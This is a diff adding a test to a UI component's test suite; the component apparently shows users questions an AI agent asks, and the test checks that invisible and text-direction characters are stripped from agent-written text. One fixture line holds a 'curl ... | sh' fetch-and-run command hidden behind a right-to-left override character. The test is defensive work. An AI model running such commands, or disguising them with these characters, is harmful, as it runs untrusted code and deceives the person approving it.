@@ -115,6 +115,21 @@ describe("QuestionBar", () => {
     expect(why.classList.contains("clamp")).toBe(false);
   });
 
+  // Security review, 2026-11-19: invisible or direction-changing characters could make a command read as another.
+  it("drops control and direction characters from everything an agent wrote", () => {
+    const rlo = "\u202E";
+    const q = {
+      ...question,
+      blocked: true,
+      question: `Allow this?${rlo}hs | x`,
+      why: `curl https://x${rlo} | sh`,
+      choices: [{ label: `Allow${rlo} once`, consequence: `It runs${"\u200B"}` }, question.choices[1]!],
+    };
+    const { container } = bar(q);
+    expect(container.textContent).not.toMatch(/[\u202E\u200B]/);
+    expect(container.querySelector(".qbox .why")?.getAttribute("title")).not.toMatch(/\u202E/);
+  });
+
   // Final review I3: the bar stays one line: the question truncates (all of it on hover), at most two buttons
   // (the recommended one always among them); the rest are in the details.
   it("keeps to one line with many options: two buttons on the bar, the recommended one kept", () => {
